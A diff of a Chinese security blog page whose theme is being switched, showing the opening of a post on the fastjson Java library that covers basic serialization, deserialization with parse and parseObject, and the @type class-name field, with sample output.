@@ -1,22 +1,24 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=dark>
-
-
-
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
-  <link rel="icon" href="/img/fav.ico">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Sl0th">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="fastjson学习fastjson组件可以类对象序列化成json字符串，再通过JSON.parse、JSON.parseObject等方法反序列化成类对象 序列化和反序列化常见类型 JSONObject JSONArray  简单使用1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Sl0th">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://sloth31.github.io/2023/02/01/fastjson学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="fastjson学习fastjson组件可以类对象序列化成json字符串，再通过JSON.parse、JSON.parseObject等方法反序列化成类对象 序列化和反序列化常见类型 JSONObject JSONArray  简单使用1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
 <meta property="og:type" content="article">
 <meta property="og:title" content="fastjson学习">
 <meta property="og:url" content="http://sloth31.github.io/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/index.html">
@@ -35,291 +37,522 @@
 <meta property="article:published_time" content="2023-02-01T14:40:37.000Z">
 <meta property="article:modified_time" content="2024-09-28T09:01:34.084Z">
 <meta property="article:author" content="Sl0th">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="java">
 <meta property="article:tag" content="fastjson">
-<meta name="twitter:card" content="summary_large_image">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241845.png">
-  
-  
-  
-  <title>fastjson学习 | Sl0th&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/macpanel.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-  
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/img/fav.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/img/fav.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/img/fav.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            fastjson学习 | Sl0th&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
+    <!--- Inject Part-->
+    
 
-  
-<meta name="generator" content="Hexo 6.1.0"></head>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/img/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/day.jpg","dark":"/img/night.jpg"},"title":"👋Welcome to Sl0th's Blog🎉","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
-  
-
-  <header>
+<div class="progress-bar-container">
     
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Sl0th&#39;s blog</strong>
-    </a>
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/img/fav.ico" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Sl0th&#39;s Blog
+                
             </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="fastjson学习"></span>
-          
         </div>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-01 22:40" pubdate>
-          2023年2月1日 晚上
-        </time>
-      </span>
-    
-  </div>
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
 
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          21k 字
-        
-      </span>
-    
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
 
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          117 分钟
-        
-      </span>
-    
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
-    
-  </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
 
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-        
-      </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
 
-      
-    </div>
-  </div>
-</div>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-</div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
 
-  </header>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-  <main>
-    
-      
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">fastjson学习</h1>
-            
-            
-              <div class="markdown-body">
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
                 
-                <h1 id="fastjson学习"><a href="#fastjson学习" class="headerlink" title="fastjson学习"></a>fastjson学习</h1><p>fastjson组件可以类对象序列化成json字符串，再通过JSON.parse、JSON.parseObject等方法反序列化成类对象</p>
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">fastjson学习</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/img/avatar.JPG">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-02-01 22:40:37</span>
+        <span class="mobile">2023-02-01 22:40:37</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-28 17:01:34</span>
+            <span class="mobile">2024-09-28 17:01:34</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/ctf/JavaSec/">JavaSec</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/fastjson/">fastjson</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/java/">java</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="fastjson学习"><a href="#fastjson学习" class="headerlink" title="fastjson学习"></a>fastjson学习</h1><p>fastjson组件可以类对象序列化成json字符串，再通过JSON.parse、JSON.parseObject等方法反序列化成类对象</p>
 <h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><ul>
 <li>JSONObject</li>
 <li>JSONArray</li>
 </ul>
-<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <br>System.out.println(serializedStr);<br><span class="hljs-comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(serializedStr); <br>System.out.println(<span class="hljs-string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName()); System.out.println(<span class="hljs-string">&quot;parse反序列化:&quot;</span>+obj1);<br><span class="hljs-comment">//通过parseObject,不指定类，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr); <br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName()); System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj2);<br><span class="hljs-comment">//通过parseObject,指定类后返回的是一个相应的类对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr,User.class); <br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName()); System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj3);<br><br><span class="hljs-comment">//@type</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(serializedStr1);<br>System.out.println(JSON.parse(serializedStr).getClass().toString());<br>System.out.println(JSON.parse(serializedStr1).getClass().toString());<br><br><span class="hljs-comment">//输出</span><br>有参构造<br>getId<br>getName&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br>parse反序列化对象名称:com.alibaba.fastjson.JSONObject<br>parse反序列化:&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>&#125;<br>parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject<br>parseObject反序列化:&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>&#125;<br>无参构造<br>setId<br>setName<br>parseObject反序列化对象名称:com.example.fastjson.User<br>parseObject反序列化:User&#123;name=<span class="hljs-string">&#x27;zhangsan&#x27;</span>, id=<span class="hljs-number">12</span>&#125;<br><span class="hljs-comment">//@type</span><br>getId<br>getName<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br>getId<br>getName<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.example.fastjson.User&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.alibaba.fastjson.JSONObject<br>无参构造<br>setId<br>setName<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.example.fastjson.User<br></code></pre></td></tr></table></figure>
